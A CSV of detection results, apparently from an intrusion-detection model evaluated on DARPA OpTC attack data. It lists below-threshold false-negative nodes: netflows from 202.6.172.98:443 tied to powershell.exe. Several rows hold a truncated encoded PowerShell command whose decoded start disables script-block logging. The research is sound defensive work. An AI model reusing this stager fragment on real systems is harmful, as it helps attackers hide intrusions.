rank,node_id,node_group,score,label,pred_above_threshold,attacks,incident_edges,responsible_loss,score_minus_responsible_loss,operation,event_uuid,time_raw,time_eastern,window,target_role,srcnode,dstnode,src_type,dst_type,type_pair,node_label_text,src_label,dst_label,score_band
737382,826452,FN_below_threshold,0.649816275,1,0,OPTC h501 attack,1,0.649816275,0.000000000,MESSAGE,726d6620-a8ae-43c9-94c4-c067989d9521,1569338928962000000,2019-09-24 11:28:48.962000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,826452,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53332,netflow 202.6.172.98:443->142.20.57.246:53332,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
737466,826799,FN_below_threshold,0.649770737,1,0,OPTC h501 attack,1,0.649770737,0.000000000,MESSAGE,a8823ced-0ba6-4878-a3a7-069893c12e79,1569339019356000000,2019-09-24 11:30:19.356000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,826799,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53338,netflow 202.6.172.98:443->142.20.57.246:53338,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
737636,828026,FN_below_threshold,0.649669766,1,0,OPTC h501 attack,1,0.649669766,0.000000000,MESSAGE,7d8172b2-9345-4491-bbf3-961ce8a70f8c,1569339139864000000,2019-09-24 11:32:19.864000 EDT,2019-09-24 11:30:44.683000000~2019-09-24 11:45:46.724000000,src,828026,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53346,netflow 202.6.172.98:443->142.20.57.246:53346,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
737768,826230,FN_below_threshold,0.649605036,1,0,OPTC h501 attack,1,0.649605036,0.000000000,MESSAGE,7c8bb126-b21e-4307-b350-93d5db8613bb,1569338868735000000,2019-09-24 11:27:48.735000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,826230,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53328,netflow 202.6.172.98:443->142.20.57.246:53328,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
738701,810605,FN_below_threshold,0.649172902,1,0,OPTC h501 attack,1,0.649172902,0.000000000,MESSAGE,54e14d48-f83f-4c7c-a4d6-f5576d870d75,1569337385035000000,2019-09-24 11:03:05.035000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,src,810605,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:50007,netflow 202.6.172.98:443->142.20.57.246:50007,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
738918,822303,FN_below_threshold,0.649085760,1,0,OPTC h501 attack,1,0.649085760,0.000000000,MESSAGE,6374ca66-b6a2-4eef-842c-3781972d2bb4,1569338012782000000,2019-09-24 11:13:32.782000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,src,822303,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53268,netflow 202.6.172.98:443->142.20.57.246:53268,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
738929,826538,FN_below_threshold,0.649081707,1,0,OPTC h501 attack,1,0.649081707,0.000000000,MESSAGE,8fda0239-35a8-4314-92e7-ce0c0fe0cde0,1569338959108000000,2019-09-24 11:29:19.108000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,826538,3986,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53334,netflow 202.6.172.98:443->142.20.57.246:53334,subject: powershell.exe | C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB,< 1.000
743702,827008,FN_below_threshold,0.647455156,1,0,OPTC h501 attack,1,0.647455156,0.000000000,MESSAGE,530296e1-5bec-4d17-ae52-cfd0fff38177,1569339041707000000,2019-09-24 11:30:41.707000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,827008,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53339,netflow 202.6.172.98:443->142.20.57.246:53339,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
744606,823275,FN_below_threshold,0.647055745,1,0,OPTC h501 attack,1,0.647055745,0.000000000,MESSAGE,5d30c705-924f-4f26-9677-c3c14e75cbfa,1569338254843000000,2019-09-24 11:17:34.843000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,823275,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53283,netflow 202.6.172.98:443->142.20.57.246:53283,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
745140,805436,FN_below_threshold,0.646782100,1,0,OPTC h501 attack,1,0.646782100,0.000000000,MESSAGE,ac3ee667-ef6a-44e2-924c-a972e8c32b96,1569336509799000000,2019-09-24 10:48:29.799000 EDT,2019-09-24 10:45:00.031000000~2019-09-24 11:00:09.455000000,src,805436,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:49972,netflow 202.6.172.98:443->142.20.57.246:49972,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
745193,822877,FN_below_threshold,0.646751285,1,0,OPTC h501 attack,1,0.646751285,0.000000000,MESSAGE,6b236861-171b-470f-be57-9e161a325ea2,1569338164285000000,2019-09-24 11:16:04.285000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,822877,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53280,netflow 202.6.172.98:443->142.20.57.246:53280,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
745393,812003,FN_below_threshold,0.646619320,1,0,OPTC h501 attack,1,0.646619320,0.000000000,MESSAGE,a30df173-6490-4e7e-993a-e2f7889220fe,1569337606861000000,2019-09-24 11:06:46.861000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,src,812003,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:50120,netflow 202.6.172.98:443->142.20.57.246:50120,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
745703,804765,FN_below_threshold,0.646381080,1,0,OPTC h501 attack,1,0.646381080,0.000000000,MESSAGE,4bcebac8-a06f-4e1e-bf5e-f50d3996a20c,1569336419022000000,2019-09-24 10:46:59.022000 EDT,2019-09-24 10:45:00.031000000~2019-09-24 11:00:09.455000000,src,804765,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:49969,netflow 202.6.172.98:443->142.20.57.246:49969,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
745744,826759,FN_below_threshold,0.646343410,1,0,OPTC h501 attack,1,0.646343410,0.000000000,MESSAGE,0d2b5ebe-e38e-4840-8ab5-0b45cdfa4b59,1569339011546000000,2019-09-24 11:30:11.546000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,826759,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53337,netflow 202.6.172.98:443->142.20.57.246:53337,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
745801,822449,FN_below_threshold,0.646294296,1,0,OPTC h501 attack,1,0.646294296,0.000000000,MESSAGE,51325ee9-72ac-4e53-9973-d049644d37e9,1569338043513000000,2019-09-24 11:14:03.513000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,src,822449,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53275,netflow 202.6.172.98:443->142.20.57.246:53275,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
745853,807782,FN_below_threshold,0.646248579,1,0,OPTC h501 attack,1,0.646248579,0.000000000,MESSAGE,eff065c3-c13d-4cdc-bd33-642ac8d0eb10,1569336962082000000,2019-09-24 10:56:02.082000 EDT,2019-09-24 10:45:00.031000000~2019-09-24 11:00:09.455000000,src,807782,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:49989,netflow 202.6.172.98:443->142.20.57.246:49989,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
745875,811067,FN_below_threshold,0.646234810,1,0,OPTC h501 attack,1,0.646234810,0.000000000,MESSAGE,1b04f8ec-e19b-48f9-a496-ff6a95458e3b,1569337449307000000,2019-09-24 11:04:09.307000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,src,811067,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:50055,netflow 202.6.172.98:443->142.20.57.246:50055,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
745907,823368,FN_below_threshold,0.646212935,1,0,OPTC h501 attack,1,0.646212935,0.000000000,MESSAGE,5a3be5b7-672c-4d25-99b5-371ee5debee4,1569338285007000000,2019-09-24 11:18:05.007000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,823368,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53284,netflow 202.6.172.98:443->142.20.57.246:53284,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746186,809157,FN_below_threshold,0.645928442,1,0,OPTC h501 attack,1,0.645928442,0.000000000,MESSAGE,053886d6-d809-4ae4-bf52-156f256fb332,1569337203025000000,2019-09-24 11:00:03.025000 EDT,2019-09-24 10:45:00.031000000~2019-09-24 11:00:09.455000000,src,809157,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:49997,netflow 202.6.172.98:443->142.20.57.246:49997,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746223,811677,FN_below_threshold,0.645890236,1,0,OPTC h501 attack,1,0.645890236,0.000000000,MESSAGE,a91d9c32-a5c6-41c0-8b6b-f679852bb8ce,1569337543296000000,2019-09-24 11:05:43.296000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,src,811677,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:50073,netflow 202.6.172.98:443->142.20.57.246:50073,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746235,812672,FN_below_threshold,0.645871878,1,0,OPTC h501 attack,1,0.645871878,0.000000000,MESSAGE,b9d05acb-4e53-4cba-957e-b4cd9aa6f92a,1569337731428000000,2019-09-24 11:08:51.428000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,src,812672,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:50129,netflow 202.6.172.98:443->142.20.57.246:50129,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746261,828154,FN_below_threshold,0.645850420,1,0,OPTC h501 attack,1,0.645850420,0.000000000,MESSAGE,9df0390a-c94d-432c-8cba-56d61c5d7e11,1569339162466000000,2019-09-24 11:32:42.466000 EDT,2019-09-24 11:30:44.683000000~2019-09-24 11:45:46.724000000,src,828154,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53347,netflow 202.6.172.98:443->142.20.57.246:53347,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746311,807694,FN_below_threshold,0.645791769,1,0,OPTC h501 attack,1,0.645791769,0.000000000,MESSAGE,3b569e85-0acb-45b6-ba6f-e4a326374d20,1569336931935000000,2019-09-24 10:55:31.935000 EDT,2019-09-24 10:45:00.031000000~2019-09-24 11:00:09.455000000,src,807694,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:49988,netflow 202.6.172.98:443->142.20.57.246:49988,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746381,826379,FN_below_threshold,0.645719826,1,0,OPTC h501 attack,1,0.645719826,0.000000000,MESSAGE,7027a4b1-203e-41b6-a68e-6e16a64f2e55,1569338920972000000,2019-09-24 11:28:40.972000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,826379,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53331,netflow 202.6.172.98:443->142.20.57.246:53331,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746430,825185,FN_below_threshold,0.645663023,1,0,OPTC h501 attack,1,0.645663023,0.000000000,MESSAGE,b612dd1c-38a1-4978-b71b-b2624447072c,1569338587795000000,2019-09-24 11:23:07.795000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,825185,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53309,netflow 202.6.172.98:443->142.20.57.246:53309,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746439,809699,FN_below_threshold,0.645654857,1,0,OPTC h501 attack,1,0.645654857,0.000000000,MESSAGE,9b525d3e-207c-4115-88ca-998dde1b002e,1569337263551000000,2019-09-24 11:01:03.551000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,src,809699,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:49999,netflow 202.6.172.98:443->142.20.57.246:49999,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746449,812555,FN_below_threshold,0.645647228,1,0,OPTC h501 attack,1,0.645647228,0.000000000,MESSAGE,627e76cc-d4b6-423b-b6ec-5f3de33e35c9,1569337697727000000,2019-09-24 11:08:17.727000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,src,812555,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:50125,netflow 202.6.172.98:443->142.20.57.246:50125,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746485,811375,FN_below_threshold,0.645608485,1,0,OPTC h501 attack,1,0.645608485,0.000000000,MESSAGE,25a4ed9c-7468-4f5d-bc8f-f1a512fddf42,1569337482583000000,2019-09-24 11:04:42.583000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,src,811375,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:50057,netflow 202.6.172.98:443->142.20.57.246:50057,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746602,808929,FN_below_threshold,0.645463705,1,0,OPTC h501 attack,1,0.645463705,0.000000000,MESSAGE,2a0d6165-b7f7-48de-8831-eb96ed5766df,1569337173011000000,2019-09-24 10:59:33.011000 EDT,2019-09-24 10:45:00.031000000~2019-09-24 11:00:09.455000000,src,808929,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:49996,netflow 202.6.172.98:443->142.20.57.246:49996,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746604,825058,FN_below_threshold,0.645461857,1,0,OPTC h501 attack,1,0.645461857,0.000000000,MESSAGE,7bfd44f9-3cf3-4dd5-8c6e-f857699f84a0,1569338557244000000,2019-09-24 11:22:37.244000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,825058,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53305,netflow 202.6.172.98:443->142.20.57.246:53305,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746610,824537,FN_below_threshold,0.645455360,1,0,OPTC h501 attack,1,0.645455360,0.000000000,MESSAGE,d387aeed-44b8-413e-9dc8-ba2bbf5e9435,1569338466646000000,2019-09-24 11:21:06.646000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,824537,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53301,netflow 202.6.172.98:443->142.20.57.246:53301,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746642,810148,FN_below_threshold,0.645406365,1,0,OPTC h501 attack,1,0.645406365,0.000000000,MESSAGE,6b73c422-4d29-4c97-8dce-2795cc63d58b,1569337323879000000,2019-09-24 11:02:03.879000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,src,810148,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:50001,netflow 202.6.172.98:443->142.20.57.246:50001,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746675,807187,FN_below_threshold,0.645371675,1,0,OPTC h501 attack,1,0.645371675,0.000000000,MESSAGE,ec03ae4e-9a7f-4859-8e1f-389e4178d6e7,1569336781171000000,2019-09-24 10:53:01.171000 EDT,2019-09-24 10:45:00.031000000~2019-09-24 11:00:09.455000000,src,807187,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:49983,netflow 202.6.172.98:443->142.20.57.246:49983,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746777,805696,FN_below_threshold,0.645255923,1,0,OPTC h501 attack,1,0.645255923,0.000000000,MESSAGE,dd211349-8e48-4318-b8da-91fce901385e,1569336570152000000,2019-09-24 10:49:30.152000 EDT,2019-09-24 10:45:00.031000000~2019-09-24 11:00:09.455000000,src,805696,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:49974,netflow 202.6.172.98:443->142.20.57.246:49974,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746790,812339,FN_below_threshold,0.645246983,1,0,OPTC h501 attack,1,0.645246983,0.000000000,MESSAGE,1570b9b6-4fcd-4cf0-9cfa-f66ad67a061a,1569337667054000000,2019-09-24 11:07:47.054000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,src,812339,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:50124,netflow 202.6.172.98:443->142.20.57.246:50124,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746823,805241,FN_below_threshold,0.645210266,1,0,OPTC h501 attack,1,0.645210266,0.000000000,MESSAGE,d104b7b8-33d5-4e0f-b2fe-0371917991e9,1569336479564000000,2019-09-24 10:47:59.564000 EDT,2019-09-24 10:45:00.031000000~2019-09-24 11:00:09.455000000,src,805241,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:49971,netflow 202.6.172.98:443->142.20.57.246:49971,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746851,822713,FN_below_threshold,0.645185053,1,0,OPTC h501 attack,1,0.645185053,0.000000000,MESSAGE,73f9248b-d8a5-43a4-bbe7-52612cb8c598,1569338134091000000,2019-09-24 11:15:34.091000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,822713,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53279,netflow 202.6.172.98:443->142.20.57.246:53279,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746891,809899,FN_below_threshold,0.645146132,1,0,OPTC h501 attack,1,0.645146132,0.000000000,MESSAGE,1f0e38d3-9f91-4df7-9603-968ca123c0e0,1569337293716000000,2019-09-24 11:01:33.716000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,src,809899,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:50000,netflow 202.6.172.98:443->142.20.57.246:50000,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746898,823211,FN_below_threshold,0.645135641,1,0,OPTC h501 attack,1,0.645135641,0.000000000,MESSAGE,71a833e2-08ff-4525-b809-c03c7b6ea76a,1569338224061000000,2019-09-24 11:17:04.061000 EDT,2019-09-24 11:15:17.708000000~2019-09-24 11:30:44.625000000,src,823211,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:53282,netflow 202.6.172.98:443->142.20.57.246:53282,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746913,812556,FN_below_threshold,0.645122290,1,0,OPTC h501 attack,1,0.645122290,0.000000000,MESSAGE,7b41269e-629b-43af-9c19-7635df796111,1569337700939000000,2019-09-24 11:08:20.939000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,src,812556,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:50126,netflow 202.6.172.98:443->142.20.57.246:50126,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746944,810604,FN_below_threshold,0.645086348,1,0,OPTC h501 attack,1,0.645086348,0.000000000,MESSAGE,4bd84984-525a-4300-8aff-fbd4c08e5215,1569337385152000000,2019-09-24 11:03:05.152000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,src,810604,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:50006,netflow 202.6.172.98:443->142.20.57.246:50006,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
746989,807353,FN_below_threshold,0.645032942,1,0,OPTC h501 attack,1,0.645032942,0.000000000,MESSAGE,67dfa25d-165e-4677-a699-4343d437062a,1569336811337000000,2019-09-24 10:53:31.337000 EDT,2019-09-24 10:45:00.031000000~2019-09-24 11:00:09.455000000,src,807353,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:49984,netflow 202.6.172.98:443->142.20.57.246:49984,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
747013,815317,FN_below_threshold,0.645005465,1,0,OPTC h501 attack,1,0.645005465,0.000000000,MESSAGE,d99f6997-86af-4e34-850b-76aea2f7f793,1569337800137000000,2019-09-24 11:10:00.137000 EDT,2019-09-24 11:00:09.457000000~2019-09-24 11:15:17.099000000,src,815317,3820,netflow,subject,netflow->subject,netflow 202.6.172.98:443->142.20.57.246:51163,netflow 202.6.172.98:443->142.20.57.246:51163,subject: /Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe,< 1.000
